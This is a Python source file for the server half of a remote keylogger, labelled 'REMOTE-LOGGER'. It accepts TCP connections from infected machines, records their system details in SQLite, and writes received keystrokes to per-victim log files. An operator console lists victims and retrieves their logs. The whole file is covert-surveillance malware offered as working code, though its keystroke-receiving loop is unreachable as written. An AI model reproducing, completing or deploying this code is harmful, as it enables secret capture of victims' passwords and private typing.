import socket
import sqlite3
import threading
from sqlite_handler import SqliteHandler



class KeyloggerServer:


    def __init__(self, port, ip):
        self.host = ip
        self.port = port
        self.sock = None
        self.client_conn_object = []
        self.client_conn_object.append("")
        self.sqliteHandler = SqliteHandler()
        self.dbConn = self.sqliteHandler.create_db()
        


    # create socket
    def create_socket(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5) #listen for connection
        except socket.error as err:
            print(f"[-]Error unable to create socket {str(err)}")



    # handle client connections
    def handle_connection(self):
        while True:
            try:

                conn, addr = self.sock.accept()   
                conn.setblocking(True) 

                print(f"\n[+]Node {addr} has connected!")
                fileName = f"{str(addr)}_log.txt"

                try:
                    with open(fileName, 'a') as file:
                        file.close()
                except OSError:
                    print("[+]unable to create file")

                data = conn.recv(65535).decode() # receives system info from client
                self.client_conn_object.append(conn) # add client conn to list as socket object cant be stored in the database
                self.sqliteHandler.store_node_data(self.dbConn, conn, fileName, data.split(",")) # store client information

            except Exception as e:
                print(e)


        while True:
            data = conn.recv(65535).decode()
            self.writeToTxt(data, fileName)



    # format text to bold and green 
    def convert_text_bold_green(self, text):
        RESET = "\033[0m"
        BOLD = "\033[1m"
        COLOR = "\u001b[32m" 
        return f"{BOLD}{COLOR}{text}{RESET}"



    # write data recieved to a text file
    def writeToTxt(self, data, fileName):
        with open(fileName, "a") as logFile:
            logFile.write(data)
            logFile.close()


    # print connected clients
    def get_connected_clients(self):
        for client in self.client_conn_object:
            print(client)

        

    def interactive_shell(self):
        while True:
            cmd = input(self.convert_text_bold_green("Keylogger: "))

            if cmd == "nodes":
                self.sqliteHandler.get_nodes_info(self.dbConn, self.client_conn_object)
            elif cmd == "":
                pass
            elif "get" in cmd:
                cmd  = cmd.split()
                self.sqliteHandler.get_file_content(str(cmd[-1]))
            else:
                print("[-]Invalid command!!!")



    def art(self):
        art = """

    ██████  ███████ ███    ███  ██████  ████████ ███████       ██       ██████   ██████   ██████  ███████ ██████  
    ██   ██ ██      ████  ████ ██    ██    ██    ██            ██      ██    ██ ██       ██       ██      ██   ██ 
    ██████  █████   ██ ████ ██ ██    ██    ██    █████   █████ ██      ██    ██ ██   ███ ██   ███ █████   ██████  
    ██   ██ ██      ██  ██  ██ ██    ██    ██    ██            ██      ██    ██ ██    ██ ██    ██ ██      ██   ██ 
    ██   ██ ███████ ██      ██  ██████     ██    ███████       ███████  ██████   ██████   ██████  ███████ ██   ██ 
                                                                                                                  
                                                                                                                
        """
        print(art)



    def start(self):
        self.art()
        self.create_socket()
        thread1 = threading.Thread(target=self.handle_connection)
        thread2 = threading.Thread(target=self.interactive_shell)
        thread1.start()
        thread2.start()
